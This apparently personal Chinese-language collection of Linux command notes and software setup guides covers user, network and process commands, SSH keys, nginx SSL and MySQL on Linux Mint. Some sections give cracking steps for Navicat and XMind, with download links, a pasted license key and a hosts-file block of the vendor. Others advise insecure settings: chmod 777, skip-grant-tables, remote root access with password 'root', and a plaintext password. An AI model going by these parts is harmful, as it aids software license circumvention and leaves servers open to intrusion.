sched.h\n默认情况下仅显示比较重要的 PID、USER、PR、NI、VIRT、RES、SHR、S、%CPU、%MEM、TIME+、COMMAND\n可以通过下面的快捷键来更改显示内容： 更改显示内容通过f键可以选择显示的内容（按f键之后会显示列的列表，按 a-z即可显示或隐藏对应的列，最后按回车键确定） 按o键可以改变列的显示顺序（按小写的a-z可以将相应的列向右移动，而大写的A-Z可以将相应的列向左移动，最后按回车键确定） 按大写的F或O键，然后按a-z可以将进程按照相应的列进行排序，而大写的R键可以将当前的排序倒转。\n用户管理 要掌握的常用命令：useradd, passwd, su。\ngroupadd groupadd命令用于创建新的用户组。语法格式：groupadd 组名 例如： [root@localhost]# groupadd mygroup\ngroupdel groupdel命令用于删除用户组。语法格式：groupdel 组名 例如： [root@localhost]# groupdel mygroup\ngroups groups命令用于显示当前用户所在的组。 例如： [root@localhost]# groups\nuseradd useradd命令用于建立用户帐号。主要参数-c：加上备注文字，备注文字保存在passwd 的备注栏中。 -d：指定用户登入时的启始目录。 -D：变更预设值。 -e：指定账号的有效期限，缺省表示永久有效。 -f：指定在密码过期后多少天即关闭该账号。 -g：指定用户所属的群组。 -G：指定用户所属的附加群组。 -m：自动建立用户的登入目录。 -M：不要自动建立用户的登入目录。 -n：取消建立以用户名称为名的群组。 -r：建立系统账号。 -s：指定用户登入后所使用的 shell。 -u：指定用户ID 号。 添加用户：useradd newuser 添加用户，指定相关参数，建立test用户，并把此用户加入root组： useradd -m -d /home/share -g root test\nuserdel userdel命令用来删除用户帐号及其相关文件。 例如： [root@localhost]# userdel newuser\npasswd passwd(password)命令用于修改用户的密码。一般来说，设置账户密码失败有几种情况：密码太简单、密码太短、密码中的字符多数相同。 语法格式：passwd 用户名 修改密码，命令如下： [root@localhost]# passwd newuser\nusermod usermod可用来修改用户帐号的各项设定。可以用来设定用户归属哪个组。 例如使得test用户加入mail组： [root@localhost]# usermod -G mail test\nsu 切换到user用户：[root@localhost]# su user 切换到 root 用户：[root@localhost]# su\nwho 查看当前计算机有哪些用户登录\nwhoami 查看当前用户的登录名。\n网络管理 需掌握的常用命令：ping, netstat, ftp,ssh, telnet, wget\nfinger (需要安装) finger需要安装才可以使用 yum install finger finger用来查询一台主机上的登录账号的信息，通常会显示用户名、主目录、 停滞时间、登录时间、登录Shell等信息，使用权限为所有用户。 命令格式：finger [选项] [使用者] [用户@主机]\n主要参数说明： -s：显示用户注册名、实际姓名、终端名称、写状态、停滞时间、登录时间等信息。 -l：除了用-s选项显示的信息外，还显示用户主目录、登录 Shell、邮件状态等信息，以及用户主目录下的.plan、.project和.forward文件的内容。 -p：除了不显示.plan文件和.project文件以外，与-l选项相同。\n应用实例： su(switch user)命令可以使得当前用户切换到另一个用户。如果要退出切换后的用户登录，可以执行exit命令。 直接键入如下命令： finger finger root\n查询远程机上的用户信息应用说明： 如果要查询远程机上的用户信息，需要在用户名后面接“@主机名”，采用[用户名@主机名]的格式，不过要查询的网络主机需要运行finger守护进程的支持。\nftp 该命令是标准的文件传输协议的用户接口，是在 TCP/IP 网络上传输文件最简单有效的方法。\nhostname 该命令用于显示或设置系统的主机名。\nnetstat netstat命令用于显示网络连接、路由表和网络接品信息，用户可以知道目前有哪些网络连接正在运行。常用选项有： -a：显示所有socket，包括正在监听的。 -c：每隔1秒钟就重新显示一遍网络信息，直到用户中断它。 -l：仅列出有在 Listen (监听) 的服务状态，格式同 “ifconfig -e”命令。 -n：以 IP 地址代替名称，显示网络连接信息。 -r：显示核心路由表，格式同“route -e”命令。 -t：显示 TCP 协议的连接信息。 -u：显示 UDP 协议的连接信息。 -v：显示正在进行的网络协议。\n应用示例： 列出所有端口：netstat -a 通过管道方式查看每一页内容：netstat -a|more 列出所有tcp端口：netstat -at 列出所有udp端口：netstat -au 列出监听端口：netstat -l 列出所有监听tcp端口：netstat -lt 列出所有监听udp端口：netstat -lu 查看80是否被占用：netstat -l|grep 80\nping ping命令可用来测试计算机和网络上的其他计算机是否连通。 例如测试本机和192.168.1.2那台机器是否连通： [root@localhost]# ping 192.168.1.2\nssh ssh命令(安全的 Shell)用于通过网络登录远程计算机，如同操作本地计算机一样。命令格式： ssh 用户@服务器IP地址 例如使用root用户登录到192.168.1.2上：ssh root@192.168.1.2 然后根据系统提示，输入登录的用户名和密码。还有一个rsh命令和ssh命令功能类似，常用的是ssh。ssh和rsh的区别： 安全级别不同，ssh的密码等都是加密传输，而且还有密钥认证的机制，而rsh是明文传输，而且没有密钥的机制。\ntelnet(不建议使用) telnet命令用于通过网络登录远程计算机，如同操作本地计算机一样。和ssh命令功能类似。ssh和telnet区别：ssh是加密的。telnet是明码传输的，发送的数据被监听后不需要解密就能看到内容。现在不建议使用telnet。\nwget wget命令用于Linux环境下从www上下载文件，支持 HTTP和FTP协议，支持代理服务器和断点续传功能，能够自动递归远程主机的目录，查找合乎要求的文件并下载到本地硬盘上，wget 命令可在后台运行，截获并忽略HANGUP信号，因此在用户退出登录之后，仍可继续运行。 例如：wget http：//url/filename\nifconfig 可以查看网卡的IP地址。 例如：[root@localhost]# ifconfig 也可以临时修改IP，重启系统后，恢复原始IP。\n查看本机ip curl ident.me\n进程管理 常用命令：ps, kill。\nps ps命令用于显示程序的状态。 例如查找所有进程：ps -aux 命令常用选项： 命令格式：ifconfig IP 地址 netmask 子网掩码 -a：显示所有用户的所有进程(包括其它用户)。 -x：显示没有控制终端的进程，同时显示各个命令的具体路径。 -u：按用户名和启动时间的顺序来显示进程。 -aux：显示所有包含其他使用者的进程。\nSTAT，状态，分别表示的含意： D：不可中断的静止 R：正在执行中 S：静止状态 T：暂停执行 Z：不存在但暂时无法消除 W：没有足够的记忆体分页可分配\u003c：高优先序的行程 N：低优先序的行程 L：有记忆体分页分配并锁在记忆体内(即时系统或A I/O)\n应用举例： 使用管道和more连用，进行分页查看： [root@localhost ~]# ps -aux |more 使用管道和grep连用，在进程中查找指定进程。 例如查找Tomcat进程：ps -aux|grep tomcat\n注意事项：如果有两条查询结果，则说明Tomcat已经启动，如果没有，则Tomcat没有启动。如果只查询出一条结果，并且以“grep tomcat”结尾，则此进程不是Tomcat进程，而是查找进程。\n把查询到的进程导出到文件： [root@localhost ~]# ps -aux \u003e tmp.txt\nkill 该命令用于终止一个程序。 一般用法格式：kill PID PID是指进程ID。例如杀掉进程号为2629的进程：kill 2629 向进程发送信号的方式，杀进程命令格式：kill -s signal PID signal是指关闭PID所指定的进程时发送的信号，PID是指进程ID。例如通过上面的进程查到Tomcat的进程ID是2629，要杀死此进程的命令： [root@localhost ~]# kill -s SIGINT 2629 或者写成： [root@localhost ~]# kill -INT 2629 或者写成： [root@localhost ~]# kill -2 2629 使用信号数字杀掉进程： signal也可以使用对应的数字代替，例如上面的命令可以写成： kill -2 2629 常用的几个信号(signal，可通过 kill -l 命令信号有哪些，及信号与数字对应关系)： SIG信号-对应数字-说明 SIGINT-2：这个就是在shell下用Ctrl+C来结束一个程序时，发送的信号，进程收到这个程序会结束。你可以用kill -INT pid来发这个信号。 SIGQUIT-3：这个是在shell下用Ctrl+\\ 来结束程序时，发送的信号， SIGKILL-9：这个信号之所以被称为“强杀”，就是因为无法改变进程收到这个信号后所执行的动作，进程只能退出。(前面说的两个信号，虽然默认是退出，但是应用程序自己可以通过signal系统调用来修改成其他动作，比如忽略那两个信号等动作)。 SIGTERM-15：程序结束(terminate)信号, 与SIGKILL不同的是该信号可以被阻塞和处理。通常用来要求程序自己正常退出\n一般情况下使用最多的是强杀： kill -9 2629\n服务管理 service Service命令用于启动、停止、重启服务程序。 启动服务命令：service 服务名 start 停止服务命令：service 服务名 stop 重启服务命令：service 服务名 restart，在Centos系统中，该指令推荐使用systemctl替代它。\n例如要启动 VSFTP 服务器： [root@localhost ~]# service vsftpd start 例如要停止 VSFTP 服务器： [root@localhost ~]# service vsftpd stop 使用systemctl命令如下： systemctl start vsftpd systemctl stop vsftpd\n常用命令实战 Linux新建组、用户、赋权 useradd：获取命令帮助 useradd -G {groupName} userName：新建用户添加到指定组（附加组），同时还会创建一个与用户同名的主组 grep groupName /etc/group：查找组 groupadd groupName：创建组 passwd userName：为用户修改密码 useradd -g {groupName} userName：新建用户添加到组并指定该组为主组（登录组） usermod -a -G groupName userName：追加用户到某个组 usermod -g groupName userName：修改某个用户主组为某个组 gpasswd -d userName groupName：将某个用户从某个组立删除 chmod -R 777：修改某个文件或目录读写权限7-xwr 6-xw 5-xr 3-wr 1-r 文件/目录拥有者权限-组群权限-其他人权限 chown -R userName{：groupName} 文件/目录：修改文件/目录的所有者（组群）\n查看文件夹大小 du -h 文件夹名\n查看端口占用情况 netstat -tunlp | grep 端口号 netstat -nltp | grep 端口号 两个使用方式一致\nLinux ssh多台主机免密登录 首先使用root登录，执行： ssh-keygen：生成ssh公钥私钥 ssh-copy-id -i /用户名/.ssh/id_rsa.pub root@ip或host：将密钥发送到对方主机，输入密码后即可实现免密码登录 ssh ip或host：使用ssh登录对方主机 scp -r root@ip或者host：文件或者目录路径 本地路径：将远程目录或者文件复制到本地\n查看服务器的配置 总核数 = 物理CPU个数 X 每颗物理CPU的核数\n总逻辑CPU数 = 物理CPU个数 X 每颗物理CPU的核数 X 超线程数\n查看物理CPU个数 cat /proc/cpuinfo| grep \"physical id\"| sort| uniq| wc -l\n查看每个物理CPU中core的个数(即核数) cat /proc/cpuinfo| grep \"cpu cores\"| uniq\n查看逻辑CPU的个数 cat /proc/cpuinfo| grep \"processor\"| wc -l\n查看CPU信息（型号） cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c\n查看Linux内核版本命令 cat /proc/version uname -a\n查看Linux系统版本的命令 lsb_release -a 这个命令适用于所有的Linux发行版\n其他 解决Linux buffer/cache内存占用过高 经常用free命令来查看系统内存的使用状态： free -m\n我们还可以使用下面这个文件来人工触发缓存清除的操作： cat /proc/sys/vm/drop_caches 默认是0\n方法是： echo 1 \u003e /proc/sys/vm/drop_caches\n当然，这个文件可以设置的值分别为1、2、3。它们所表示的含义为： echo 1 \u003e /proc/sys/vm/drop_caches：表示清除pagecache。 echo 2 \u003e /proc/sys/vm/drop_caches：表示清除回收slab分配器中的对象（包括目录项缓存和inode缓存）。slab分配器是内核中管理内存的一种机制，其中很多缓存数据实现都是用的pagecache。 echo 3 \u003e /proc/sys/vm/drop_caches：表示清除pagecache和slab分配器中的缓存对象。\nhttps://www.cnblogs.com/rocky-AGE-24/p/7629500.html\nlinux查看硬盘使用情况 df -hl\n磁盘占用过大 目前发现占用磁盘过大的有：\njenkins docker Centos7设置定时清除buff/cache的脚本 最近发现buff/cache持续缓慢上升，慢慢把服务器64G的内存都吃掉了，还没发现是谁产生的问题，只能先写个清除缓存的脚本解决一下。 切换到root用户 su -root\n创建脚本文件 touch cleanCache.sh vim cleanCache.sh\n添加如下内容：\n1 2 3 4 5 6 #!/bin/bash #每两小时清除一次缓存 echo \"开始清除缓存\" sync;sync;sync #写入硬盘，防止数据丢失 sleep 10 #延迟10秒 echo 3 \u003e /proc/sys/vm/drop_caches 创建定时任务 crontab -e //弹出配置文件\n添加如下内容：（按需修改） 0 */2 * * * ./cleanCache.sh\n保证crond启动以及开机自启 systemctl start crond.service systemctl enable crond.service\n查看buff/cache情况 free -m\n查看定时任务是否被执行 cat /var/log/cron | grep cleanCache 只要任务创建了，即使退出用户登录，任务还是会执行。 此方法清理缓存只是紧急临时用的，不建议在生产环境中使用此方法。\n注意：此方法不能用于解决统物理内存占用过高，导致部分服务被强制关闭的问题 要从根本上解决服务器内存占用过高的问题，参考这篇文章\nubuntu下使用filezilla上传文件失败的问题 open for write: permission denied 原因：用户没有上传文件到该目录下面的权限。 解决：使用以下命令给我们需要放入的目标文件权限，我这里是操作opt文件夹的权限，如果你要操作所有目录权限，把opt修改为home即可，命令如下： sudo chmod 777 /opt/ 试试能不能传，不能就重启服务器： sudo /etc/init.d/vsftpd restart\napache下载文件 找到apache的安装目录，httpd目录 进入到conf.d目录下 删掉welcome.conf rm –rf welcome.conf 回到apache的安装目录下，进入到conf 文件夹下 查看httpd.conf文件(里面有默认访问页面的路径) vi httpd.conf 找到这个： DocumentRoot \"/var/www/html\" 这个是你apache默认的访问页面，进入到这个文件夹 这个文件夹下的内容会被显示到apahce的默认访问页里，把你想要下载的东西打包成压缩文件，传到这个文件夹下，就可以通过ip访问下载了。 磁盘满了 nginx启动报错： nginx: [crit] pwrite() \"/usr/local/nginx/logs/nginx.pid\" failed (28: No space left on device) 磁盘满了，查一下 df -h\n查看所有路径下大于100M的文件 find / -size +100M |xargs ls -lh 大部分情况是因为某些日志把磁盘写满了。\n清空文件内容几种方式： echo \u003e filename echo \"\" \u003e filename \u003e filename : \u003e filename cat /dev/null \u003e filename\nnohup java -jar xxxx.jar \u0026 直接用java -jar xxx.jar，当退出或关闭shell时，程序就会停止掉。 java -jar xxx.jar \u0026 nohup java -jar xxxx.jar \u0026\n通过密钥登陆linux 制作密钥对 首先用密码登录到你打算使用密钥登录的账户，然后执行以下命令： ssh-keygen\n1 2 3 4 5 6 7 8 9 Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): \u003c== 按 Enter Created directory '/root/.ssh'. Enter passphrase (empty for no passphrase): \u003c== 输入密钥锁码，或直接按 Enter 留空 Enter same passphrase again: \u003c== 再输入一遍密钥锁码 Your identification has been saved in /root/.ssh/id_rsa. \u003c== 私钥 Your public key has been saved in /root/.ssh/id_rsa.pub. \u003c== 公钥 The key fingerprint is: 0f:d3:e7:1a:1c:bd:5c:03:f1:19:f1:22:df:9b:cc:08 root@host 在 当前 用户的家目录中生成了一个 .ssh 的隐藏目录，内含两个密钥文件。id_rsa 为私钥，id_rsa.pub 为公钥。\n在服务器上安装公钥 1 2 cd .ssh cat id_rsa.pub \u003e\u003e authorized_keys 如此便完成了公钥的安装。为了确保连接成功，请保证以下文件权限正确：\n1 2 chmod 600 authorized_keys chmod 700 ~/.ssh 设置 SSH，打开密钥登录功能 编辑 /etc/ssh/sshd_config 文件 vim /etc/ssh/sshd_config\n添加如下设置：\n1 2 RSAAuthentication yes PubkeyAuthentication yes 请留意 root 用户能否通过 SSH 登录： PermitRootLogin yes\n当你完成全部设置，并以密钥方式登录成功后，可以禁用密码登录： PasswordAuthentication no\n最后，重启 SSH 服务： service sshd restart\n复制私钥id_rsa到本地 私钥的位置在：/root/.ssh/id_rsa 用vim打开id_rsa，复制内容，在本地合适的位置创建id_rsa文件，黏贴。\n登录 本机ssh登录的时候，选择公钥方式登录，然后选择id_rsa文件。\n问题 用私钥登录，提示：WARNING: UNPROTECTED PRIVATE KEY FILE! 意思是说我的私钥权限太宽了（too open），需要限制。 linux，用chomd命令就可以解决：\n1 2 cd .ssh chmod 700 id_rsa 但是我的电脑是windows环境，不能用上面的命令。 找到密钥文件id_rsa，修改它的权限。 右键 属性-\u003e安全-\u003e高级-\u003e点击禁用继承-\u003e从此对象中删除所有已继承的权限。 然后点击添加-\u003e选择主体，输入电脑用户名（就是你开机的时候那个账户名），然后一路确定就可以了。上面的操作是仅仅让文件所有者（电脑开机的那个账户）拥有对文件的所有权限，其他的人并没有权限。\n参考\n阿里云升级https 申请证书 登录阿里云-\u003e控制台-\u003e产品与服务-\u003e安全（云盾）-\u003eSSL证书(应用安全)-\u003e购买证书-\u003e免费型DV SSL-\u003e购买并支付(这里支付0.00，就是不用花钱) 然后回到控制台-\u003eSSL证书(应用安全)，可以看到刚才购买的免费SSL证书。\n点击右侧的证书申请，填写申请人的详细信息，然后点击下一步，进入证书验证信息页面。在这个界面可以看到三个值：记录类型、主机记录和记录值。\n找到你的域名供应商控制台，我的是腾讯云，进入控制台，在左上角云产品的下拉列表搜索云解析，进入会看到你的域名，点击右侧的解析，点击左上角的添加记录\n根据提示分别填入上边的三个信息，然后确认保存，解析记录添加成功。\n回到阿里云，点击验证，成功会提示：已经成功提交到CA公司，请您保持电话畅通，并及时查阅邮箱中来自CA公司的电子邮件。\n安静的等待审核通过，一般十分钟就通过了，审核通过后会在ssl证书页面看到证书的状态是已签发。\n点击右侧的下载，根据自己的服务器类型选择证书下载，我下载nginx版本，顺便打开帮助文档，按照文档来。\n在Nginx的安装目录下创建cert目录，并且将下载的全部文件拷贝到cert目录中，注意这里先解压再上传到服务器，应该是两个文件，分别是.key和.pem结尾的。\n打开nginx.conf配置文件，做如下配置：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 server { listen 80 default backlog=2048; listen 443 ssl; server_name api.zjxk12.com; # ssl开头的都是证书配置 ssl_certificate /usr/local/nginx/cert/api.zjxk12.com.pem; ssl_certificate_key /usr/local/nginx/cert/api.zjxk12.com.key; ssl_session_cache shared:SSL:1m; ssl_session_timeout 5m; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; # 端口转发 location / { proxy_pass http://api.zjxk12.com:8000; index index.html index.htm; } location ~.txt{ root /usr/local/src; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } ssl开头的都是证书配置，要按照规定写，其他参数根据自己需求填写。 填完之后启动nginx报错： nginx: [emerg] the \"ssl\" parameter requires ngx_http_ssl_module in /usr/local/nginx/conf/nginx.conf:105 原因也很简单，nginx缺少http_ssl_module模块，编译安装的时候带上–with-http_ssl_module配置就行了，但是现在的情况是我的nginx已经安装过了，怎么添加模块，其实也很简单，往下看： 做个说明：我的nginx的安装目录是/usr/local/nginx这个目录，我的源码包在/usr/local/src/nginx-1.6.2目录\nNginx开启SSL模块 切换到源码包： cd /usr/local/src/nginx-1.11.3 查看nginx原有的模块 /usr/local/nginx/sbin/nginx -V 在configure arguments:后面显示的原有的configure参数如下： --prefix=/usr/local/nginx --with-http_stub_status_module 那么我们的新配置信息就应该这样写： ./configure --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module 报错：./configure: error: SSL modules require the OpenSSL library. 那就安装它： yum -y install openssl openssl-devel 然后继续执行上边的命令，就成功了。\n上面的命令运行完，再执行： make 这里不要进行make install，否则就是覆盖安装 然后备份原有已安装好的nginx cp /usr/local/nginx/sbin/nginx /usr/local/nginx/sbin/nginx.bak\n停止nginx，先找到进程号： netstat -nltp|grep 80 kill 13589\n然后将刚刚编译好的nginx覆盖掉原有的nginx（这个时候nginx要停止状态） cp ./objs/nginx /usr/local/nginx/sbin/ 提示：cp overwrite...? 此时输入y，然后回车，直接回车则不执行任何操作。\n然后启动nginx，在nginx的sbin目录下执行 ./nginx\n通过命令查看是否已经加入成功 /usr/local/nginx/sbin/nginx -V\n参考地址\nLinuxMint gedit sudo apt-get install gedit 文件编辑器，比vi、vim好用一些。\njdk 首先卸载系统自带的jdk，查看安装的软件包 sudo dpkg –list | grep -i jdk\n删除jdk sudo apt-get purge openjdk*\n删除其他的包 sudo apt-get purge icedtea-* openjdk-* cd /usr/lib/jvm （如果没有jvm这个目录，就不用管这步了） sudo rm -rf jdk\n再次确认是否被删除 sudo dpkg –list | grep -i jdk\nhttps://www.oracle.com/technetwork/java/javase/downloads/index.html 下载想要的jdk，下载完成后，解压到/opt目录 sudo tar zxvf jdk.tar.gz -C /opt/ 注意将jdk改成自己下载的jdk名字\n下面配置环境变量，需要提前安装gedit，如上。 gedit安装好后，sudo gedit /etc/profile 在 profile 文件的后面加上以下语句\n1 2 3 4 5 # JAVA Config export JAVA_HOME=/opt/jdk1.8.0_101 export JRE_HOME=/opt/jdk1.8.0_101/jre export CLASSPATH=.:$JAVA_HOME/lib:$JRE_HOME/lib:$CLASSPATH export PATH=$JAVA_HOME/bin:$JRE_HOME/bin:$PATH 注意将jdk名字改成自己的。\n使文件立即生效 source /etc/profile 在终端输入java -version，看到版本号说明成功。\nnode https://nodejs.org/zh-cn/download/ 官网下载linux版本的二进制文件 xz -d node-v8.11.1-linux-x64.tar.xz 上边指令执行完后，文件末尾没有.xz了，然后将文件解压到想要的目录 sudo tar zxvf node_10.15.tar -C /home/wjy/install\n添加链接，可以全局使用命令 ln -s /root/node-10.15/bin/node /usr/local/bin/node ln -s /root/node-10.15/bin/npm /usr/local/bin/npm\n执行完在终端任意目录 输入 node -v，看到版本号说明成功。\nsnap 1 2 sudo apt-get install snapd sudo apt-get install snapcraft 列出已经安装的snap包 sudo snap list\n搜索要安装的snap包 sudo snap find 安装一个snap包 sudo snap install 更新一个snap包，如果你后面不加包的名字的话那就是更新所有的snap包 sudo snap refresh 把一个包还原到以前安装的版本 sudo snap revert 删除一个snap包 sudo snap remove 安装网易云音乐 sudo snap install netease-music --devmode --beta\n安装微信 sudo snap install electronic-wechat 需要重启才能在左下角管理中看到微信\ngit 更新linux mint 内核及软件包\n1 2 sudo apt-get update sudo apt-get upgrade 使用dpkg包管理器查询是否已安装git sudo dpkg -l git\n通过apt-get 安装软件库中最新版本的git\n1 sudo apt-get install git 检查是否安装成功 git --version\nidea中配置git 使用apt-get install 方式安装的软件， 1.下载的软件存放位置 /var/cache/apt/archives\n2.安装后软件默认位置 /usr/share\n3.可执行文件位置 /usr/bin\n4.配置文件位置 /etc\n5.lib文件位置 /usr/lib\n所以在idea中配置git的可执行文件，选择位置use/bin/git 点击test，显示git版本号，说明成功，就可以从github或coding上拉取代码了。\nzookeeper 下载地址： http://mirror.bit.edu.cn/apache/zookeeper/ 下载stable版本。\n将下载好的.gz解压并复制到想要的位置。/home/wjy/install\n在zk的根目录创建两个文件夹data和data_log，分别用来存放zk的数据以及日志。然后进入到data目录，使用pwd指令查看并复制data目录的绝对路径。\n进入zookeeper的conf目录下，复制zoo_sample.cfg为zoo.cfg cp zoo_sample.cfg zoo.cfg\n然后编辑zoo.cfg，修改或新增下面两行配置：\n1 2 dataDir=/home/wjy/install/zookeeper-3.4.13/data dataLogDir=/home/wjy/install/zookeeper-3.4.13/data_log 保存并退出。\nzoo.cfg只存放了单机的配置，想配置集群需要在最后面加上其他服务器的ip和端口。\n到zk的bin目录下启动： ./zkServer.sh start\n查看状态 ./zkServer.sh status\n1 2 3 ZooKeeper JMX enabled by default Using config: /home/wjy/install/zookeeper-3.4.13/bin/../conf/zoo.cfg Mode: standalone 出现上边的状态说明启动成功。 standalone：单机\nredis https://redis.io/ 官网下载，解压并复制到想要的位置 /home/wjy/install\ncd到redis根目录下，执行 make 报错：\n1 2 3 net.c:36:23: fatal error: sys/types.h: No such file or directory(没有那个文件或目录) ... adlist.c:32:20: fatal error: stdlib.h: No such file or directory 原因是缺少文件，执行以下命令后再次make： sudo apt-get install libc6-dev\n还是报错: zmalloc.h:50:31: fatal error: jemalloc/jemalloc.h: No such file or directory\n原因是libc不是默认的分配器，在make后添加参数解决： sudo make MALLOC=libc\n等待执行完成，到redis/src目录下，执行 ./redis-server 出现端口号和进程PID，证明启动成功。\npostman https://www.getpostman.com/downloads/ 下载对应版本.gz,并解压到理想位置。\n创建全局变量，也就是在任何地方都可以执行postman，不用去到安装目录，执行 sudo ln -s /home/wjy/install/Postman/Postman /usr/bin/postman\n添加启动器应用图标，也就是可以从启动器快速启动，执行 vim /usr/share/applications/postman.desktop 填写如下内容：注意修改路径\n1 2 3 4 5 6 7 8 [Desktop Entry] Encoding=UTF-8 Name=Postman Exec=postman Icon=/home/wjy/install/Postman/resources/app/assets/icon.png Terminal=false Type=Application Categories=Development; 然后就可以在启动器搜索到postman，然后可以将该应用添加到桌面。\nnavicat 官网下载：https://www.navicat.com.cn/download/navicat-premium 直接下载试用版，解压到理想位置。 进入到解压好的目录,启动 ./start_navicat 启动成功。\n将navicat快捷方式添加到桌面 vim /usr/share/applications/navicat.desktop 填写如下内容：注意修改路径\n1 2 3 4 5 6 7 8 9 10 [Desktop Entry] Encoding=UTF-8 Name=Navicat Premium Comment=The Smarter Way to manage dadabase Exec=/bin/sh \"/home/wjy/install/navicat121_premium_cs_x64/start_navicat\" Icon=/home/wjy/install/navicat121_premium_cs_x64/navicat.png Categories=Application;Database;MySQL;navicat Version=1.0 Type=Application Terminal=0 然后就可以在启动器搜索到navicat，可以将该应用添加到桌面。\n编辑解压目录下的start_navicat文件，修改export LANG=”en_US.UTF-8”，改为export LANG=”zh_CN.UTF-8”。 进入后发现还是部分乱码，这时需要打开navicat，点击上边选项卡的第五个，为工具，点击下拉选最后一个选项，然后将常规、编辑器、记录三个位置的字体改成能正常显示的字体。\n破解： 在windows破解好后，linux上安装相同版本，然后将windows，Navicat Premium目录下所有文件拷贝到linux，navicat121_premium_cs_x64中的Navicat目录。 其实就是在windows破解好后，再整体复制到linux替换原文件。不是非要自己的电脑是双系统，可以用别的windows电脑破解再copy。 可以直接下载如下windows破解版：https://pan.baidu.com/s/10z5Ozjqdhar1bj0YVR0GMA，提取码：z86k，不过这个是Navicat_11版本的。\nmysql 安装 sudo apt-get install mysql-server mysql-common mysql-client sudo /etc/init.d/mysql restart\n设置初始密码： sudo mysql_secure_installation 按照引导设置密码\n登录 sudo mysql -u root -p 必须带sudo，不然会出现Access denied for user ‘root‘@‘localhost‘ 然后输入刚才设置的密码。\n解决Access denied 问题： 参考地址：https://www.cnblogs.com/cpl9412290130/p/9583868.html\n终端输入： sudo gedit /etc/mysql/mysql.conf.d/mysqld.cnf 然后在这个配置文件中的[mysqld]这一块中加入skip-grant-tables这句话，位置随意，直接加在第一行即可。 作用：就是让你可以不用密码登录进去mysql。 重启mysql：service mysql restart\n在终端上输入mysql -u root -p，遇见输入密码的提示直接回车即可,进入mysql后，分别执行下面三句话：\n1 2 3 use mysql; 然后敲回车 update user set authentication_string=password(\"你的密码\") where user=\"root\"; 然后敲回车 flush privileges; 然后敲回车 然后输入quit，退出mysql。\n重新进入到mysqld.cnf文件中去把刚开始加的skip-grant-tables这条语句给注释掉。\n再返回终端输入mysql -u root -p，应该就可以进入数据库了。\n如果此时还是报出错误，那么就需要返回step3中，把注释掉的那条语句重新生效（就是删除#符号），重新进入mysql中，先选择一个数据库（use mysql;）,然后输入select user,plugin from user; 可以看到在执行了select user,plugin from user;后，错误原因是因为plugin root的字段是auth_socket，那我们改掉它为下面的mysql_native_password就行了。输入： update user set authentication_string=password(\"ln122920\"),plugin='mysql_native_password' where user='root'; 然后回车执行以下，再输入select user,plugin from user;回车，我们能看到root用户的字段改成功了。 最后quit退出,再次mysql -u root -p，成功！\n重启服务： service mysql restart\n修改密码级别： set global validate_password_policy=0; set global validate_password_length=4;\n配置远程连接 修改配置文件 sudo gedit /etc/mysql/mysql.conf.d/mysqld.cnf 找到bind-address = 127.0.0.1，将后边的ip修改为：0.0.0.0\n为需要远程登录的用户赋予权限 为root用户赋予权限： grant all privileges on *.* to 'root'@'%' identified by 'root' with grant option; 注意修改identified by后边的密码。 可能会报错： Your password does not satisfy the current policy requirements 这时修改密码级别： set global validate_password_policy=0; set global validate_password_length=4;\n然后执行赋权语句成功，刷新权限： flush privileges;\n重启mysql服务： service mysql restart\nbeyond compare https://www.scootersoftware.com/download.php?zz=kb_linux_install 查看官网，通过官网提示安装\n1 2 3 4 wget https://www.scootersoftware.com/bcompare-4.2.9.23626_amd64.deb sudo apt-get update sudo apt-get install gdebi-core sudo gdebi bcompare-4.2.9.23626_amd64.deb 卸载 sudo apt-get remove bcompare\nxmind 官网下载linux客户端： https://www.xmind.cn/download/xmind8/ 一定要下载zip版的。\n下载破解文件： https://pan.baidu.com/s/1DOYU_OuOrIUPJoywsQswVA 提取码：f3jj\n将XMind_amd64.tar.gz下的两个文件XMind.ini和XMindCrack.jar放到XMind_amd64目录下。\n通过如下命令修改hosts文件： sudo vi /etc/hosts 在文件的末尾添加： 127.0.0.1 www.xmind.net\n回到解压后的文件夹的根目录，运行./setup.sh.，安装好依赖库之后，再次进入XMind_amd64，双击运行XMind文件。 在XMind主界面依次：Help(帮助) -\u003e License(序列号)，复制以下license key填入，邮箱随便填：\n1 XAka34A2rVRYJ4XBIU35UZMUEEF64CMMIYZCK2FZZUQNODEKUHGJLFMSLIQMQUCUBXRENLK6NZL37JXP4PZXQFILMQ2RG5R7G4QNDO3PSOEUBOCDRYSSXZGRARV6MGA33TN2AMUBHEL4FXMWYTTJDEINJXUAV4BAYKBDCZQWVF3LWYXSDCXY546U3NBGOI3ZPAP2SO3CSQFNB7VVIY123456789012345 然后激活成功。\n字体 终端字体 文泉驿等宽微米黑 Bold 快捷键 在应用程序中搜索\"窗口管理器”，然后点击键盘，将： “工作区\"和\"移动窗口至工作去\"等与ctrl和alt相关的快捷键全部清除 在窗口管理器-键盘，找到\"显示桌面”，将快捷键改为super+D(保持与windows一致) 在应用程序中搜索\"键盘\"，应用程序和快捷键选项卡，找到： /usr/bin/xflock4，修改为Super+L xfce4-appfinder，保留原快捷键 x-terminal-emulator，修改为Alt+/ ctrl+alt+s 这个快捷键是idea的setting的快捷键，但是在mint中被fcitx输入法占用了。 右键右下角的输入法，选择配置fcitx-\u003e全局配置-\u003e显示高级选项，找到想修改的快捷键，建议直接置空(选中后，点击esc)。 VI模式中上下左右键和回退键出现字母 sudo vi /etc/vim/vimrc.tiny 上下左右字母： 这个文件里面的倒数第二句话是“set compatible”改为“set nocompatible”\n回退健： 在“set nocompatible”后面(下一行)加上 set backspace=2\nctrl+alt+f12 不只是linuxmint，Ubuntu、deepin等按这组快捷键都会黑屏，不要害怕，不是黑屏，ctrl+alt+f7可以返回。 ALT＋CTRL+F1——F6可进入6个终端，F7开始到F12有6个图形界面，f7是我们安装的图形界面，所以ctrl+alt+f7可以返回。 参考地址：https://askubuntu.com/questions/277517/what-does-ctrl-alt-f12-do\n主文件夹的中文文件夹改为英文 因为是中文版，/home/wjy 